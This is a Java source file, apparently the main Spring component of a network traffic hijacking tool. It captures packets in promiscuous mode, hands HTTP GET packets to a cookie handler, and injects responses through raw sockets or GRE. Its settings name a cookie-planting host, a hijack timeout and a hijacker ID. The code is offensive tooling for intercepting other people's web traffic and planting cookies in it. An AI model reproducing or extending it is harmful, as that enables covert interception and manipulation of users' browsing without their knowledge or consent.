package com.asme.collector;

import java.lang.Thread.UncaughtExceptionHandler;
import java.lang.reflect.Field;
import java.net.InetAddress;

import javax.annotation.PostConstruct;
import javax.annotation.PreDestroy;

import jpcap.NetworkInterface;
import jpcap.packet.TCPPacket;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.beans.BeansException;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.ApplicationContext;
import org.springframework.context.ApplicationContextAware;
import org.springframework.stereotype.Component;

import com.asme.collector.packet.captor.JpcapPacketCaptor;
import com.asme.collector.packet.handler.CookieHandler;
import com.asme.collector.packet.handler.HttpGetPacketHandler;
import com.asme.collector.packet.processor.IntfDeviceGrePacketProcessor;
import com.asme.collector.packet.processor.IntfDevicePacketProcessor;
import com.asme.collector.packet.processor.RawSocketGrePacketProcessor;
import com.asme.collector.packet.processor.RawSocketPacketProcessor;
import com.asme.collector.util.LinkedTransferQueue;
import com.asme.collector.util.NetInterfaceUtil;
import com.asme.collector.util.SystemTime;
import com.asme.collector.util.Timer;
import com.asme.collector.util.TimerTask;

/**
 * @author asme
 *
 */
@Component("hijacker")
public class Hijacker implements ApplicationContextAware {

	private static final Log log = LogFactory.getLog(Hijacker.class);

	// 应用上下文
	private ApplicationContext applicationContext;

	// 抓包器
	private JpcapPacketCaptor packetCaptor;

	// 要抓包的网卡的IP
	@Value("#{props['CaptorIntf']}")
	private String captIntfIp;

	// 是否混杂模式
	@Value("#{props['PromiscMode']}")
	private boolean promiscMode;

	// 发包处理器的个数
	@Value("#{props['ProcessorNum']}")
	private int processorNum;

	// 是否使用原始Socket
	@Value("#{props['UseRawSocket']}")
	private boolean sendByRawSocket;

	// 是否使用GRE封包
	@Value("#{props['UseGRE']}")
	private boolean encByGre;

	// 发送数据的网卡的IP
	@Value("#{props['SenderIntf']}")
	private String sendIntfIp;

	// 发送数据的网卡的IP
	@Value("#{props['srcAddr']}")
	private String srcAddr;

	// 封包的DestIP
	@Value("#{props['DestAddr']}")
	private String destAddr;

	// 发送数据网卡对接的那头的设备的MAC;
	@Value("#{props['SenderGateWayMac']}")
	private String destMac;

	// 最大的数据包长度
	@Value("#{props['MaxPacketDataLength']}")
	private int maxPacketDataLength;

	// 劫持间隔
	@Value("#{props['Timeout']}")
	private int hijTimeout;

	// 种cookie的服务器
	@Value("#{props['PlantCookieHost']}")
	private String plantCookieHost;

	// 状态显示间隔
	@Value("#{props['DisplayInterval']}")
	private int statusInterval;

	// 用户来源标识
	@Value("#{props['hijackerId']}")
	private String hijackerId;

	// 发包线程
	private Thread[] threads;

	/**
	 * 初始化
	 * 
	 * @throws Exception
	 */
	@PostConstruct
	@SuppressWarnings("unchecked")
	public void init() throws Exception {
		log.info("加载lib包");
		addLibDir("lib");

		final NetworkInterface captIntf = NetInterfaceUtil.getIntfByMACAddr(captIntfIp);
		NetworkInterface sendIntf = sendByRawSocket ? null : NetInterfaceUtil.getIntfByMACAddr(captIntfIp);

		packetCaptor = new JpcapPacketCaptor();
		packetCaptor.setCaptIntf(captIntf);
		packetCaptor.setPromiscMode(promiscMode);

		log.info("启动抓包器");
		final SystemTime systemTime = applicationContext.getBean("systemTime", SystemTime.class);
		Timer timer = applicationContext.getBean("timer", Timer.class);
		final LinkedTransferQueue<TCPPacket>[] packetQueues = new LinkedTransferQueue[processorNum];
		threads = new Thread[processorNum];
		UncaughtExceptionHandler h = new UncaughtExceptionHandler() {
			public void uncaughtException(Thread t, Throwable e) {
				log.error("线程[" + t.getName() + "]发生异常", e);
			}
		};
//		HuayangHandler.setSystemTime(systemTime);
//		HuayangHandler.init();
//		DodHandler.setSystemTime(systemTime);
//		DodHandler.init();
		CookieHandler.setSystemTime(systemTime);
		CookieHandler.init();
//		ZhadaHandler.setSystemTime(systemTime);
//		ZhadaHandler.init();
//		
//		DodMQHandler.init();
//		CollYHDHandler.setSystemTime(systemTime);
//		CollYHDHandler.init();
		for (int i = 0; i < processorNum; i++) {
			packetQueues[i] = new LinkedTransferQueue<TCPPacket>();
			HttpGetPacketHandler[] handlers = { 
//					new CollYHDHandler(),new DodMQHandler(), 
					new CookieHandler() 
//					new DodHandler()
					};
			threads[i] = new Thread(sendByRawSocket ? (encByGre ? new RawSocketGrePacketProcessor(packetQueues[i], handlers, InetAddress.getByName(sendIntfIp), InetAddress.getByName(destAddr))
					: new RawSocketPacketProcessor(packetQueues[i], handlers)) : (encByGre ? new IntfDeviceGrePacketProcessor(sendIntf, destMac, packetQueues[i], handlers,
					InetAddress.getByName(srcAddr), InetAddress.getByName(destAddr)) : new IntfDevicePacketProcessor(sendIntf, destMac, packetQueues[i], handlers)));
			threads[i].setPriority(Thread.MAX_PRIORITY);
			threads[i].setUncaughtExceptionHandler(h);
			threads[i].start();
			try {
				Thread.sleep(50);
			} catch (InterruptedException e) {
			}
		}
		packetCaptor.setPacketQueues(packetQueues);
		packetCaptor.start();

		// 每隔1秒输出计数信息
		timer.timing(new TimerTask() {
			private long lcapted = 0; // 截止到上一秒已经抓到的包数
			private long lfailed = 0; // 截止到上一秒失败的包数
			private StringBuilder sb = new StringBuilder();

			public void run() {
				long capted = packetCaptor.getCapted();
				long failed = packetCaptor.getFailed();
				sb.append("C: ").append((capted - lcapted) * 1000 / statusInterval).append("\tF: ").append((failed - lfailed) * 1000 / statusInterval).append("\tH: ")
						.append("\tPOST: ").append(CookieHandler.POSTNUM.get());
				lcapted = capted;
				lfailed = failed;
				log.info(sb);
				sb.delete(0, sb.length());
			}

			public Type type() {
				return Type.INTERVAL;
			}

			public long delayOrIntervalMillis() {
				return statusInterval;
			}

			public boolean isTriggerIndependently() {
				return false;
			}
		});

		// 每秒检查超时情况
		timer.timing(new TimerTask() {
			public void run() {

				CookieHandler.clearTimeouts();
				if (!packetCaptor.isAlive()) {
					packetCaptor = new JpcapPacketCaptor();
					packetCaptor.setCaptIntf(captIntf);
					packetCaptor.setPromiscMode(promiscMode);
					packetCaptor.setPacketQueues(packetQueues);
					packetCaptor.start();
					log.warn("抓包线程意外关闭,已重启");
				}
			}

			public Type type() {
				return Type.INTERVAL;
			}

			public long delayOrIntervalMillis() {
				return 30000;
			}

			public boolean isTriggerIndependently() {
				return false;
			}
		});
	}

	/**
	 * 销毁
	 */
	@PreDestroy
	public void destroy() {
		packetCaptor.stop();
		for (Thread t : threads)
			t.interrupt();
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see
	 * org.springframework.context.ApplicationContextAware#setApplicationContext
	 * (org.springframework.context.ApplicationContext)
	 */
	@Override
	public void setApplicationContext(ApplicationContext applicationContext) throws BeansException {
		this.applicationContext = applicationContext;
	}

	/**
	 * 获取抓包量
	 * 
	 * @return
	 */
	public long getCapted() {
		return packetCaptor.getCapted();
	}

	/**
	 * 将抓包的库添加到库路径中
	 */
	private void addLibDir(String dir) {
		try {
			Field field = ClassLoader.class.getDeclaredField("usr_paths");
			field.setAccessible(true);
			String[] libDirs = (String[]) field.get(null);
			for (String libDir : libDirs)
				if (libDir.equals(dir))
					return;
			String[] t = new String[libDirs.length + 1];
			System.arraycopy(libDirs, 0, t, 0, libDirs.length);
			t[libDirs.length] = dir;
			field.set(null, t);
		} catch (Exception e) {
			log.error("添加本地库路径失败", e);
		}
	}
}
